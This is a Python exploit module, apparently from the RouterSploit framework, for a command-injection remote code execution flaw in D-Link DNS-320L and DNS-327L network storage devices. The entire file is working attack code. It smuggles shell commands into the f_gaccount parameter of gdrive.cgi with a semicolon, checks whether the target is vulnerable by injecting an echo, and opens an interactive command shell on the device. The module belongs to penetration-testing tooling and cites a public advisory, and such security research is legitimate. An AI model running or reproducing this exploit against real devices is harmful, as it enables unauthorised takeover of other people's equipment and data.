import re
import string
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DNS-320L & DIR-327L RCE",
        "description": "Module exploits D-Link DNS-320L, DNS-327L Remote Code Execution "
                       "vulnerability which allows executing command on the device.",
        "authors": (
            "Gergely Eberhardt",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.search-lab.hu/media/D-Link_Security_advisory_3_0_public.pdf",
        ),
        "devices": (
            "D-Link DNS-320L 1.03b04",
            "D-Link DNS-327L, 1.02",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        mark = utils.random_text(32)
        path = "/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo {};".format(cmd, mark)

        response = self.http_request(
            method="GET",
            path=path,
        )
        if response is None:
            return ""

        if mark in response.text:
            regexp = "(|.+?){}".format(mark)
            res = re.findall(regexp, response.text, re.DOTALL)

            if len(res):
                return res[0]

        return ""

    @mute
    def check(self):
        number = int(utils.random_text(6, alph=string.digits))
        solution = number - 1

        cmd = "echo $(({}-1))".format(number)
        path = "/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;" \
               "{};echo ffffffffffffffff;".format(cmd)

        response = self.http_request(
            method="GET",
            path=path
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and str(solution) in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
